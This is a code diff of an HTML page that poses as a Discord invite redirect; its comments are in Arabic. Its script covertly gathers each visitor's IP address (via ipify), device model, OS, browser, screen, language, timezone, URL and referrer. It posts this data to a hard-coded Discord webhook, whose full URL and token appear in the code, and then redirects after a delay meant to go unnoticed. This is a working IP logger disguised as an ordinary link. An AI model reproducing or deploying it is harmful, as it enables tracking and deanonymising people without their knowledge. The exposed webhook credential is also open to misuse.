@@ -7,13 +7,14 @@
 </head>
 <body>
     <script>
+        console.log("✅ صفحة التوجيه تعمل - بدء جمع البيانات");
+
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515988891528728637/_Bbemq0uCRzXVVcdpeByhDd-roIa11FjFCDXe91hzUqufGvC4cjTrUpHn5EcUYTEISlw";
         const DISCORD_REDIRECT = "https://discord.gg/M9L";
 
-        // === جمع البيانات الأساسية (بدون انتظار الشبكة) ===
+        // === جمع البيانات الأساسية ===
         const ua = navigator.userAgent;
         
-        // موديلات iPhone كاملة
         const iPhoneModels = {
             "1,1":"iPhone 2G","1,2":"iPhone 3G","2,1":"iPhone 3GS","3,1":"iPhone 4","3,2":"iPhone 4","3,3":"iPhone 4","4,1":"iPhone 4s","4,2":"iPhone 4s","4,3":"iPhone 4s","5,1":"iPhone 5","5,2":"iPhone 5","5,3":"iPhone 5c","5,4":"iPhone 5c","6,1":"iPhone 5s","6,2":"iPhone 5s","7,1":"iPhone 6 Plus","7,2":"iPhone 6","8,1":"iPhone 6s","8,2":"iPhone 6s Plus","8,4":"iPhone SE (1st gen)","9,1":"iPhone 7","9,2":"iPhone 7 Plus","9,3":"iPhone 7","9,4":"iPhone 7 Plus","10,1":"iPhone 8","10,2":"iPhone 8 Plus","10,3":"iPhone X","10,4":"iPhone 8","10,5":"iPhone 8 Plus","10,6":"iPhone X","11,2":"iPhone XS","11,4":"iPhone XS Max","11,6":"iPhone XS Max","11,8":"iPhone XR","12,1":"iPhone 11","12,3":"iPhone 11 Pro","12,5":"iPhone 11 Pro Max","12,8":"iPhone SE (2nd gen)","13,1":"iPhone 12 mini","13,2":"iPhone 12","13,3":"iPhone 12 Pro","13,4":"iPhone 12 Pro Max","14,4":"iPhone 13 mini","14,5":"iPhone 13","14,2":"iPhone 13 Pro","14,3":"iPhone 13 Pro Max","14,6":"iPhone SE (3rd gen)","15,4":"iPhone 14","15,5":"iPhone 14 Plus","15,2":"iPhone 14 Pro","15,3":"iPhone 14 Pro Max","16,3":"iPhone 15","16,4":"iPhone 15 Plus","16,1":"iPhone 15 Pro","16,2":"iPhone 15 Pro Max"
         };
@@ -34,7 +35,6 @@
             if (ua.includes("Edg/")) return "Edge"; if (ua.includes("Firefox/")) return "Firefox"; if (ua.includes("Chrome/") && !ua.includes("Edg")) return "Chrome"; if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Safari"; if (ua.includes("OPR/")) return "Opera"; return "Other";
         }
         
-        // البيانات الأساسية
         const basicData = {
             timestamp: new Date().toISOString(),
             os: getOS(ua),
@@ -47,38 +47,33 @@
             referrer: document.referrer || "مباشر"
         };
         
-        // === جلب IP فقط من ipify (أسرع وأضمن) ===
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
                 const data = await res.json();
                 return data.ip;
             } catch(e) {
-                console.warn("IP fetch failed", e);
                 return "غير متاح";
             }
         }
         
-        // === إرسال البيانات إلى Webhook ===
         async function sendData(ip) {
-            const fullData = { ...basicData, ip: ip, location: "عن بعد (بدون تفاصيل إضافية)" };
             const embed = {
                 title: "🕵️ زائر جديد - توجيه فوري",
                 color: 0x2C3E50,
                 fields: [
-                    { name: "🌍 IP", value: fullData.ip, inline: true },
-                    { name: "📱 الجهاز", value: fullData.device, inline: true },
-                    { name: "💿 نظام التشغيل", value: fullData.os, inline: true },
-                    { name: "🌐 المتصفح", value: fullData.browser, inline: true },
-                    { name: "🖥️ الشاشة", value: fullData.screen, inline: true },
-                    { name: "🔤 اللغة", value: fullData.language, inline: true },
-                    { name: "🕐 المنطقة الزمنية", value: fullData.timezone, inline: true },
-                    { name: "🔗 الرابط", value: fullData.url, inline: false },
-                    { name: "🔗 المُحيل", value: fullData.referrer, inline: false }
+                    { name: "🌍 IP", value: ip, inline: true },
+                    { name: "📱 الجهاز", value: basicData.device, inline: true },
+                    { name: "💿 نظام التشغيل", value: basicData.os, inline: true },
+                    { name: "🌐 المتصفح", value: basicData.browser, inline: true },
+                    { name: "🖥️ الشاشة", value: basicData.screen, inline: true },
+                    { name: "🔤 اللغة", value: basicData.language, inline: true },
+                    { name: "🕐 المنطقة", value: basicData.timezone, inline: true },
+                    { name: "🔗 الرابط", value: basicData.url, inline: false },
+                    { name: "🔗 المُحيل", value: basicData.referrer, inline: false }
                 ],
                 footer: { text: "تم التوجيه وجمع البيانات لكل زائر" }
             };
-            
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -87,17 +82,13 @@
                     keepalive: true
                 });
             } catch(e) {
-                console.warn("Webhook send failed, trying sendBeacon", e);
-                const blob = new Blob([JSON.stringify({ embeds: [embed] })], { type: 'application/json' });
-                navigator.sendBeacon(WEBHOOK_URL, blob);
+                navigator.sendBeacon(WEBHOOK_URL, new Blob([JSON.stringify({ embeds: [embed] })], {type: 'application/json'}));
             }
         }
         
-        // === التنفيذ: جلب IP ثم إرسال ثم توجيه بتأخير كافٍ ===
         (async () => {
             const ip = await getIP();
             await sendData(ip);
-            // تأخير 300ms لضمان اكتمال الطلبات (لا يشعر به المستخدم)
             setTimeout(() => {
                 window.location.replace(DISCORD_REDIRECT);
             }, 300);
